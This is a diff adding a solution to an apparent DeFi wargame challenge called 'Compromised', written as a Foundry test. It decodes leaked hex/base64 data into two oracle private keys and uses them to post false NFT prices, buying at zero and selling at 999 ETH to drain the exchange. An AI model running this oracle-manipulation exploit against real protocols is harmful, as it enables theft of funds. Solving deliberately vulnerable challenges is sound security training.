@@ -75,7 +75,42 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // SINGLE COMMAND LINE THAT DOES ALL THIS
+        // ```bash
+        // echo "4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 
+        // 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 
+        // 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30" | xxd -r -p | base64 -d
+        // ```
+        // WHAT THIS DOES
+        // `echo "..."` prints the hex.
+        // `xxd -r -p` converts the Hex to ASCII text (Layer 1).
+        // `base64 -d` decodes that text from Base64 into the final private key (Layer 2).
         
+        // decoded the first key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        // decoded the second key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+
+        // lets find the address of the sources(price oracle) from the private-key
+        address source1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address source2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        // you already have the price oracle, you can then manipulate
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 0 ether);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 0 ether);
+        // buy the ETH at 0
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        assertEq(nft.balanceOf(player), 1);
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 999 ether);        
+        // sell to drain the DEX
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        (bool success,) = recovery.call{value: 999 ether}("");
+        vm.stopPrank();
     }
 
     /**
